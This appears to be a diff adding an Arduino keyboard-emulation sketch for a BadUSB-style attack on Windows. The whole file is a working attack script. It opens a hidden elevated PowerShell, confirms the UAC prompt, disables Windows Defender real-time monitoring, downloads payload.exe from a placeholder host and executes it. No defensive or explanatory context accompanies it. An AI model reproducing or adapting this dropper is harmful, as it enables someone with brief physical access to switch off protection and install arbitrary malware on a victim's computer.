@@ -1,0 +1,96 @@
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+
+  Keyboard.print("powershell Start-Process powershell -Verb runAs -WindowStyle Hidden");
+
+  delay(200);
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+
+  delay(900);
+
+  Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  Keyboard.print("$url = \"http://adress/payload.exe\"");
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  Keyboard.print("$output = \"DownloadLocation\\payload.exe\"");
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  Keyboard.print("Invoke-WebRequest -Uri $url -OutFile $output");
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  Keyboard.print("$e = New-Object -com shell.application");
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  Keyboard.print("$e.shellexecute($output);");
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  Keyboard.print("exit");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
